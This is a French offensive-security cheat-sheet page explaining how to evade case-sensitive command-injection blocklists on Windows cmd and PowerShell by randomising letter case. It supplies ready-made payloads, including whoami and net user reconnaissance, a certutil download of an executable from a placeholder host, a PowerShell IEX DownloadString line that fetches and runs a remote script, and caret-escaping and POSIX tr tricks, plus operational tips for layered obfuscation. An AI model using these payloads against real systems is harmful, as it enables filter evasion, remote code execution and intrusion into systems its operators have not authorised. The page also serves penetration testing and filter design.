---
title: "Contournement de filtre d'injection de commande par casse aléatoire"
description: "Contourner les listes de blocage sensibles à la casse en variant la capitalisation, wHoAmi, CeRTutil, là où l'interpréteur est insensible à la casse (Windows cmd, PowerShell) pour que la commande se résolve quand même ; contrasté avec le POSIX sensible à la casse."
keywords:
  - injection de commande
  - casse aléatoire
  - insensible à la casse
  - contournement de filtre
  - windows cmd
  - powershell
---

# Casse aléatoire

Une liste de blocage écrite dans une casse, disons qu'elle bloque `whoami`, est mise en échec en changeant la capitalisation lorsque l'**interpréteur résout les commandes de manière insensible à la casse**. `wHoAmi` n'est pas la chaîne `whoami`, donc un filtre naïf par sous-chaîne le laisse passer, pourtant Windows `cmd.exe` et PowerShell l'exécutent à l'identique. L'astuce repose sur un décalage : le filtre compare des octets, le shell replie la casse.

## Pourquoi l'interpréteur le normalise

Sous Windows, la résolution des noms de commandes et d'exécutables est **insensible à la casse** : le système de fichiers, `cmd.exe` et PowerShell traitent tous `WHOAMI`, `whoami` et `wHoAmi` comme le même programme. La liste de blocage inspecte la requête littérale et voit `wHoAmi`, qui n'est pas égal au `whoami` bloqué ; elle laisse passer la requête. Le shell replie ensuite la casse du nom pendant qu'il localise le binaire et l'exécute. Le mot-clé que le filtre protégeait n'apparaît jamais dans sa casse attendue, mais la commande se résout quand même, la normalisation se produit dans la recherche de l'interpréteur, après le filtre.

## Payloads (Windows)

Casse mixte contre une liste de blocage sensible à la casse :

```
wHoAmi
WhOaMi
nEt UsEr
iPcOnFiG /aLl
cErTuTiL -UrLcAcHe -f http://OOB/x x.exe   # download via certutil
pOwErShElL -c "gEt-pRoCeSs"
```

Les cmdlets, paramètres et opérateurs PowerShell sont de même insensibles à la casse :

```
IeX(nEw-ObJeCt NeT.wEbClIeNt).DoWnLoAdStRiNg('http://OOB/s.ps1')
gEt-CoNtEnT C:\Windows\win.ini
```

Combinez avec d'autres évasions Windows, l'échappement par accent circonflexe dans `cmd.exe` et le repli de casse se cumulent :

```
wh^oa^mi            # caret removed by cmd, case still folded
```

## POSIX est sensible à la casse

Sur les shells Linux/macOS, la résolution des commandes est **sensible à la casse** : `WHOAMI` n'est pas `whoami` et la recherche dans `PATH` ne le trouvera pas. La casse aléatoire seule ne fonctionne **pas** contre un sink POSIX, `cat` et `CAT` sont des noms différents. Atteignez le même but avec des utilitaires insensibles à la casse à la place :

```
$(tr "[A-Z]" "[a-z]" <<< "WHOAMI")       # downcase the string first, then run the result
`echo WHOAMI | tr "[:upper:]" "[:lower:]"`   # same idea with backtick substitution
```

Parce que POSIX ne replie pas la casse pour vous, la casse aléatoire est à proprement parler une technique **Windows** ; sous POSIX, réservez-la aux arguments qu'un programme analyse de manière insensible à la casse, pas au nom de la commande.

## Notes opérationnelles

- Confirmez d'abord l'OS et l'interpréteur cibles : le repli de casse est gratuit sous Windows `cmd`/PowerShell, indisponible pour les noms de commandes POSIX.
- La casse aléatoire se marie bien avec l'échappement par accent circonflexe (`cmd`), l'insertion d'accents graves/guillemets (PowerShell) et l'assemblage par variables d'environnement pour une obfuscation en couches.
- La technique ne met en échec que la correspondance **sensible à la casse** ; un filtre qui met l'entrée en minuscules avant de comparer n'est pas affecté, donc variez aussi la structure environnante.

## Outils

- **[Burp Suite](https://portswigger.net/burp)** : Repeater et Intruder pour des payloads à casse variée.
- **[commix](https://github.com/commixproject/commix)** : les scripts tamper automatisent la casse et l'obfuscation.

## Références

- [PayloadsAllTheThings: Command Injection, Bypass case sensitive](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [LOLBAS Project](https://lolbas-project.github.io/)
